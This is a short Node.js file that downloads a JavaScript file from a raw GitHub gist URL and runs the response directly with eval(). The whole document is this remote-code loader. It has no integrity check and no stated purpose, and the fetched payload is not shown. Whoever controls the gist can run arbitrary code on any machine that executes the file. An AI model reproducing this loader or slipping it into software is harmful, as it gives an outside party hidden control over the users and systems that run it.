const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/bdf63cfc1c4922bd448eacd540e37fef1b57e3f1/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
